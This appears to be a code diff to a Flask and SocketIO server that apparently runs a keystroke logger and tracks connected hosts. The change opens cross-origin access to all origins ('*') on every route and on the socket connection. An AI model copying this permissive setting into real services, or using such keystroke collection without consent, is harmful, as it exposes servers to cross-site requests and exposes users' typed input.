@@ -16,6 +16,7 @@ from flask import redirect
 from flask import send_from_directory
 from flask import send_file
 from flask import url_for
+from flask_cors import CORS
 
 from flask_socketio import SocketIO, emit
 from datetime import datetime
@@ -73,8 +74,9 @@ keystroke_logger = loggers.KeystrokeLogger()
 # create server ---------------------------------------------------------------
 
 app                         = Flask(__name__)
+cors                        = CORS(app,resources={r"/*":{"origins":"*"}})
 app.config['SECRET_KEY']    = gen_cnf['secret_key']
-socketio                    = SocketIO(app)
+socketio                    = SocketIO(app, cors_allowed_origins="*")
 hosts                       = {}
 configs                     = None
 
